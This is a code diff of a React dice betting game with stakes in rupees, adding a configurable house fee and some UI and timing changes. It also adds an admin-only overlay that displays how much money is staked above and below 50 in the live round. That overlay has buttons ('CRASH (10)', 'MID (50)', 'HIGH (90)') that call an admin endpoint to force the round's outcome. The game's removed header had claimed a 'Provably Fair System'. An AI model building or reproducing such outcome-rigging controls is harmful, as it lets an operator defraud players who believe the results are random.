@@ -1,12 +1,30 @@
 import { useState, useEffect } from 'react'
+import { translateError } from '../utils/errorTranslator'
 import { useUser } from '../context/UserContext'
 import { useGame } from '../context/GameContext'
 import { ArrowLeft, HelpCircle, Trophy, Sparkles, Check, X, Gamepad2, Clock, Lock, Play, Loader2, History, Shield, AlertCircle } from 'lucide-react'
 import GameLobbyModal from '../components/GameLobbyModal'
 
 export default function DiceGame({ onNavigate }) {
-  const { balance, setRealBalance, betsList, fetchUserHistory } = useUser()
+  const { user, balance, setRealBalance, betsList, fetchUserHistory } = useUser()
   const [loading, setLoading] = useState(false)
+  const [diceHouseFee, setDiceHouseFee] = useState(2.0)
+
+  useEffect(() => {
+    const fetchMultipliers = async () => {
+      try {
+        const API_BASE = import.meta.env.VITE_API_URL || `${window.location.protocol}//${window.location.hostname}:5000`
+        const res = await fetch(`${API_BASE}/api/games/multipliers`)
+        if (res.ok) {
+          const data = await res.json()
+          setDiceHouseFee(data.diceHouseFee !== undefined ? parseFloat(data.diceHouseFee) : 2.0)
+        }
+      } catch (err) {
+        console.error('Failed to fetch dice edge multiplier config:', err)
+      }
+    }
+    fetchMultipliers()
+  }, [])
   
   // Lobby modal state
   const [showLobby, setShowLobby] = useState(false)
@@ -20,7 +38,61 @@ export default function DiceGame({ onNavigate }) {
   const [betDetails, setBetDetails] = useState(null) // { amount, condition, target, multiplier }
 
   // central socket state mapping
-  const { diceTimeLeft, diceRoundId, dicePhase, diceHistory, diceResult, diceScrambleTrigger } = useGame()
+  const { diceTimeLeft, diceRoundId, dicePhase, diceHistory, diceResult, diceScrambleTrigger, socket } = useGame()
+
+  // --- Admin Live Metrics Overlay State ---
+  const [liveMetrics, setLiveMetrics] = useState({});
+  const isAdmin = user?.role === 'admin' || user?.role === 'super_admin';
+
+  useEffect(() => {
+    if (isAdmin && socket) {
+      socket.on('live_bet_metrics', (data) => {
+         if (data && data.dice && data.dice[diceRoundId]) {
+           setLiveMetrics(data.dice[diceRoundId]);
+         } else {
+           setLiveMetrics({});
+         }
+      });
+    }
+    return () => {
+      if (isAdmin && socket) {
+        socket.off('live_bet_metrics');
+      }
+    };
+  }, [isAdmin, socket, diceRoundId]);
+
+  const handleAdminOverride = async (val) => {
+    if (!isAdmin) return;
+    if (!window.confirm(`[ADMIN OVERRIDE] Force result to ${val}?`)) return;
+    
+    try {
+      const token = localStorage.getItem('token');
+      const res = await fetch(`${import.meta.env.VITE_API_URL || ''}/api/admin/game/overwrite`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Authorization': `Bearer ${token}`
+        },
+        body: JSON.stringify({
+          gameType: 'dice',
+          roundId: diceRoundId,
+          outcome: val
+        })
+      });
+      let data = {};
+      try {
+        data = await res.json();
+      } catch (jsonErr) {}
+      
+      if (res.ok) {
+        alert('Force Override Success!');
+      } else {
+        alert('Override Failed: ' + (data.error || res.statusText || 'HTTP Error ' + res.status));
+      }
+    } catch(err) {
+      alert('Override Network Error');
+    }
+  };
   const timeLeft = diceTimeLeft
   const gameId = diceRoundId
   const isRolling = diceScrambleTrigger
@@ -72,7 +144,7 @@ export default function DiceGame({ onNavigate }) {
       ? target
       : 10 // Range mode is a fixed size 10 selection (10% chance)
 
-  const calculatedMult = 98 / winChance
+  const calculatedMult = (100 - diceHouseFee) / winChance
   const multiplier = Math.max(1.03, Math.min(20.00, calculatedMult)).toFixed(2)
   const potentialProfit = (betAmount * parseFloat(multiplier) - betAmount).toFixed(2)
 
@@ -133,14 +205,15 @@ export default function DiceGame({ onNavigate }) {
         condition: condition,
         target: target,
         multiplier: parseFloat(multiplier),
-        id: data.bet?._id
+        id: data.bet?._id || data.bet?.id,
+        roundId: data.bet?.roundId
       })
 
       // Fetch latest bets immediately to display the new pending bet in the list
       fetchUserHistory()
     } catch (err) {
       console.error(err)
-      setErrorToast(err.message || 'Connection error. Please try again.')
+      setErrorToast(translateError(err.message))
     } finally {
       setLoading(false)
     }
@@ -172,7 +245,7 @@ export default function DiceGame({ onNavigate }) {
       setDisplayRoll(finalRoll.toFixed(2))
       setActualRoll(finalRoll)
 
-      if (betPlaced && betDetails) {
+      if (betPlaced && betDetails && String(diceResult.gameId) === String(betDetails.roundId)) {
         let userWon = false
         if (betDetails.condition === 'over') {
           userWon = finalRoll > betDetails.target
@@ -191,7 +264,7 @@ export default function DiceGame({ onNavigate }) {
         setBetDetails(null)
       }
     }
-  }, [isRolling, diceResult, betPlaced, betDetails, gameId])
+  }, [isRolling, diceResult, betPlaced, betDetails])
 
   // Clear result toast auto-dismiss
   useEffect(() => {
@@ -217,44 +290,19 @@ export default function DiceGame({ onNavigate }) {
       ? `linear-gradient(to right, #dcfce7 0%, #dcfce7 ${target}%, #fee2e2 ${target}%, #fee2e2 100%)`
       : `linear-gradient(to right, #fee2e2 0%, #fee2e2 ${target}%, #dcfce7 ${target}%, #dcfce7 ${target + 10}%, #fee2e2 ${target + 10}%, #fee2e2 100%)`
 
-  const isLocked = dicePhase === 'locked' || diceTimeLeft <= 15
+  const isLocked = dicePhase === 'locked' || diceTimeLeft <= 5
   const isBettingDisabled = isRolling || betPlaced || isLocked
 
   return (
-    <div className="flex flex-col min-h-screen bg-[#f8fafc] text-slate-800 font-sans pb-20 relative select-none">
-      
-      {/* ── HEADER ── */}
-      <header className="sticky top-0 z-40 bg-white/80 backdrop-blur-xl border-b border-slate-200/85 px-4 py-4 flex items-center justify-between shadow-sm">
-        <button onClick={() => onNavigate?.('game')} className="w-9 h-9 rounded-xl bg-white border border-slate-200 flex items-center justify-center hover:bg-slate-50 transition-colors shadow-sm cursor-pointer border-0 outline-none">
-          <ArrowLeft size={18} className="text-slate-650" />
-        </button>
-        <div className="flex flex-col items-center">
-          <div className="flex items-center gap-1.5">
-            <h1 className="text-base font-bold text-slate-800 tracking-tight flex items-center gap-1.5">
-              <Sparkles size={16} className="text-primary animate-pulse" /> Dice Pro
-            </h1>
-            <span className="bg-indigo-50 border border-indigo-100 text-indigo-700 text-[9px] font-black px-2 py-0.5 rounded-full ml-0.5 animate-pulse">
-              Auto 30s
-            </span>
-          </div>
-          <div className="flex items-center gap-1 mt-0.5">
-            <Shield size={10} className="text-emerald-500" />
-            <span className="text-[9px] text-slate-400 font-medium">Provably Fair System</span>
-          </div>
-        </div>
-        <div className="flex gap-2">
-          <button 
-            onClick={() => setShowLobby(true)} 
-            title="Games Lobby"
-            className="w-9 h-9 rounded-xl bg-white border border-slate-200 flex items-center justify-center hover:bg-slate-50 transition-colors shadow-sm cursor-pointer"
-          >
-            <Gamepad2 size={16} className="text-slate-655" />
-          </button>
-          <button onClick={() => setShowRules(true)} className="w-9 h-9 rounded-xl bg-white border border-slate-200 flex items-center justify-center hover:bg-slate-50 transition-colors shadow-sm cursor-pointer">
-            <HelpCircle size={18} className="text-slate-500" />
-          </button>
-        </div>
-      </header>
+    <div className="flex flex-col min-h-screen bg-transparent text-slate-800 font-sans pb-20 relative select-none">
+      {/* Floating Rules Button aligned symmetrically with back button */}
+      <button
+        onClick={() => setShowRules(true)}
+        className="absolute -top-12 right-4 z-40 w-10 h-10 rounded-full bg-slate-950/60 hover:bg-slate-900/80 flex items-center justify-center border border-slate-800 shadow-lg backdrop-blur-sm cursor-pointer text-slate-300 hover:text-white transition-all active:scale-95"
+        title="Rules"
+      >
+        <HelpCircle size={20} />
+      </button>
 
       {/* ── RULES MODAL ── */}
       {showRules && (
@@ -286,6 +334,37 @@ export default function DiceGame({ onNavigate }) {
         </div>
       )}
 
+      
+      {/* ADMIN HUD OVERLAY */}
+      {isAdmin && (
+        <div className="px-4 pt-4 relative z-10">
+          <div className="bg-gray-900/95 border border-indigo-500/50 rounded-2xl p-4 relative overflow-hidden backdrop-blur-xl shadow-lg">
+             <div className="absolute top-0 right-0 bg-indigo-500 text-white text-[10px] font-bold px-3 py-1 rounded-bl-lg tracking-widest shadow-md">
+               ADMIN HUD ACTIVE
+             </div>
+             <h3 className="text-white font-bold mb-3 text-sm flex items-center gap-2">
+               <Shield size={16} className="text-indigo-500" /> LIVE DICE STAKED POOLS
+             </h3>
+             
+             <div className="flex gap-3 mb-2">
+                <button onClick={() => handleAdminOverride('10')} className="flex-1 bg-gray-800 hover:bg-gray-700 border border-gray-700 rounded-xl p-2 transition-all cursor-pointer">
+                   <div className="text-gray-400 font-bold text-xs">CRASH (10)</div>
+                </button>
+                <button onClick={() => handleAdminOverride('50')} className="flex-1 bg-indigo-500/20 hover:bg-indigo-500/40 border border-indigo-500/30 rounded-xl p-2 transition-all cursor-pointer">
+                   <div className="text-indigo-400 font-bold text-xs">MID (50)</div>
+                </button>
+                <button onClick={() => handleAdminOverride('90')} className="flex-1 bg-emerald-500/20 hover:bg-emerald-500/40 border border-emerald-500/30 rounded-xl p-2 transition-all cursor-pointer">
+                   <div className="text-emerald-400 font-bold text-xs">HIGH (90)</div>
+                </button>
+             </div>
+             <div className="text-white text-xs mt-3 flex justify-between bg-black/30 p-2 rounded-lg border border-white/5">
+                <span><span className="text-emerald-400 font-bold">ABOVE 50:</span> ₹{liveMetrics['above_50'] || 0}</span>
+                <span><span className="text-red-400 font-bold">BELOW 50:</span> ₹{liveMetrics['below_50'] || 0}</span>
+             </div>
+          </div>
+        </div>
+      )}
+      
       {/* ── WALLET BALANCE CARD ── */}
       <div className="px-4 pt-4 relative z-10">
         <div className="bg-white border border-slate-200/60 rounded-2xl p-4 flex items-center justify-between shadow-sm">
@@ -523,7 +602,7 @@ export default function DiceGame({ onNavigate }) {
 
           {/* Interactive controls (with locking overlay) */}
           <div className="relative p-0.5 rounded-3xl overflow-hidden">
-            {isLocked && timeLeft <= 15 && (
+            {isLocked && timeLeft <= 5 && (
               <div className="absolute inset-0 bg-white/75 backdrop-blur-[1.5px] rounded-3xl z-30 flex flex-col items-center justify-center animate-[fadeIn_0.2s_ease-out]">
                 <Clock size={28} className="text-rose-500 mb-1.5 animate-bounce" />
                 <span className="text-rose-600 text-[10px] font-black uppercase tracking-widest">Betting Locked</span>
